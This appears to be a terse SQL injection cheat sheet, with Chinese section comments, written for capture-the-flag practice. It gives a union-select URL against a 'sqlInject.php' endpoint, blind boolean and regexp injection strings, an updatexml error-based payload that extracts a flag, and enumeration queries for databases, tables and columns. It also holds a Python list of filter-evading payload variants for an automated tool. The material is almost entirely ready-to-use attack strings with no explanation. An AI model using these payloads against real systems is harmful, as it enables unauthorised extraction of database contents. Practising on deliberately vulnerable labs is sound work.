- ```sql
  http://172.27.16.101:20123/sqlInject.php?id=2 union select (select group_concat(table_name) from information_schema.tables where table_schema=database())
  xxx'||(mid((select(group_concat(table_name))from(sys.schema_auto_increment_columns)where((table_schema)like(0x6d656469756d))),1,1)like('c'))||'
  xxx'||(mid((select(group_concat(table_name))from(sys.schema_auto_increment_columns)where((table_schema)like(0x6d656469756d))),%d,1)regexp'%s$')||'
  "||updatexml(1,concat(0x7e,(select(flag)from(flag)),0x7e),1)#
  ```
-
- ```sql
  # 数据库名
  select database()
  # 数据库版本名
  select version()
  # 表名
  select group_concat(table_name) from information_schema.tables where table_schema=database()
  select(group_concat(table_name)from(mysql.innodb_table_stats)where((database_name)regexp(database())
  select(group_concat(table_name))from(information_schema.tables)where(table_schema)regexp(database())
  (select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer))
  # 列名
  select group_concat(column_name) from information_schema.columns where table_name="table_name2333"
  select(group_concat(column_name))from(information_schema.columns)where(table_name='table_name2333')
  # 从表中选择
  select * from flag
  select(group_concat(password))from(F1naI1y)
  ```
- ```python
  sql_targets = Targets(
      database=["database()"],
      all_databases=["(select group_concat(schema_name) from information_schema.schemata)"],
      version=["version()"],
      table_name=[
          "(select group_concat(table_name) from information_schema.tables where table_schema=database())",
          "(select(group_concat(table_name))from(information_schema.tables)where(table_schema)regexp(database()))",
          "(Select(Group_Concat(Table_name))From(InfOrmation_Schema.Tables)Where(Table_Schema)Regexp(Database()))",
          "(select(group_concat(table_name)from(mysql.innodb_table_stats)where((database_name)regexp(database())))",
          "(select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer))"
      ],
      column_name=[
          "(select(group_concat(column_name))from(information_schema.columns)where(table_name='TABLE_NAME'))",
          "(Select(Group_Concat(Column_Name))From(InfOrmation_Schema.Columns)Where((Table_Name)regexp'TABLE_NAME'))",
          "(select group_concat(column_name) from information_schema.columns where table_name='TABLE_NAME')",
      ]
  )
  ```